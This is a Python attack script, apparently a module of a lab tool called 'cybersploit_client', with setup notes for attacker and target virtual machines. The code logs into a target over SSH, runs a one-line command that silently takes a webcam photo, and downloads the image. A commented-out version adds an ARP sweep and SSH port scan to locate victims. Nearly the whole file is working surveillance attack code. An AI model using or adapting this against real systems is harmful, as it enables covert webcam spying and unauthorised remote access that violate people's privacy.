# implementation steps: 
#Pre-Test Setup (Target VM)
# The tester must first prepare the "Victim" machine.
#  Network Configuration: Ensure the VM is on a Bridged Adapter or NAT Network so it is reachable by the Attacker IP.
# Enable SSH: Run sudo systemctl start ssh. The attack script looks for this port to identify the target.
# Dependencies: Run sudo apt update && sudo apt install python3-opencv -y
#  Identify Credentials: Run whoami and ip addr and provide these to the Attacker.

# Execution Steps (Attack VM)
# Once the target is live, the tester performs the following on the "Attacker" machine:
# Library Installation: Ensure the environment has the necessary communication tools: pip install paramiko scp scapy
# Run the Attack: * Execute: python3 camera_capture.py
# Enter Password: When prompted, type the Target VM's user password (the text will be hidden).

# Wait for Confirmation: The terminal should display:
# Connected to [IP]
# Executing remote capture...
# Success! Photo saved as captured_from_target.jpg

# this was created with the help of chatgpt and stack overflow code 

# import paramiko
# import scp
# import getpass
# import socket

# def find_target_ip():
#     # 1. Get your own IP to find the network range
#     hostname = socket.gethostname()
#     local_ip = socket.gethostbyname(hostname)
#     network_prefix = ".".join(local_ip.split('.')[:-1]) + ".0/24"
    
#     print(f"Scanning network: {network_prefix} for SSH targets...")
    
#     # 2. Scan the network for active devices
#     arp_request = scapy.ARP(pdst=network_prefix)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     request_broadcast = broadcast/arp_request
#     answered_list = scapy.srp(request_broadcast, timeout=1, verbose=False)[0]

#     for element in answered_list:
#         ip = element[1].psrc
#         if ip == local_ip: continue # Skip yourself
        
#         # 3. Check if Port 22 is open on the found IP
#         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#             s.settimeout(0.1)
#             if s.connect_ex((ip, 22)) == 0:
#                 print(f"Target found: {ip}")
#                 return ip
#     return None

# def remote_capture(target_ip):
#     username = "target_user" # You still need a known username
#     password = getpass.getpass(f"Enter password for {username}@{target_ip}: ")

#     try:
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(target_ip, username=username, password=password)
        
#         # Command to capture
#         cmd = "python3 -c 'import cv2; c=cv2.VideoCapture(0); s,i=c.read(); cv2.imwrite(\"snap.jpg\",i); c.release()'"
#         ssh.exec_command(cmd)
        
#         # Transfer
#         with scp.SCPClient(ssh.get_transport()) as scp_client:
#             scp_client.get("snap.jpg", "captured_from_target.jpg")
        
#         print("Success!")
#         ssh.close()
#     except Exception as e:
#         print(f"Failed: {e}")

# if __name__ == "__main__":
#     target = find_target_ip()
#     if target:
#         remote_capture(target)
#     else:
#         print("No Target VM found with SSH enabled.")

import sys
import os
import getpass 
import paramiko
import scp

# This finds the directory two levels up and adds it to Python's search path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

# Now you can use an absolute import instead of relative dots
from cybersploit_client.commands import Command 

TARGET_IP = "192.168.209.129"
USERNAME = "e1-target"

password = getpass.getpass(f"Enter password for {USERNAME}@{TARGET_IP}: ")

def camera_capture():
    try:
        # 1. Connect to the Target VM
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=password)
        
        print(f"Connected to {TARGET_IP}")

        # 2. Command the target to take a photo
        # This assumes the target has python and opencv installed
        capture_command = (
            "python3 -c 'import cv2; cam = cv2.VideoCapture(0); "
            "s, img = cam.read(); cv2.imwrite(\"remote_snap.jpg\", img); cam.release()'"
        )
        
        print("Executing remote capture...")
        ssh.exec_command(capture_command)

        # 3. Download the photo back to the Attacker VM
        with scp.SCPClient(ssh.get_transport()) as scp_client:
            scp_client.get("remote_snap.jpg", "captured_from_target.jpg")
        
        print("Success! Photo saved as captured_from_target.jpg")
        ssh.close()

    except Exception as e:
        print(f"Attack failed: {e}")

class CameraCapture(Command):
    """take pic with camera"""
    
    def do_command(self, lines: str, *args):
        camera_capture()

command = CameraCapture

if __name__ == "__main__":
    camera_capture()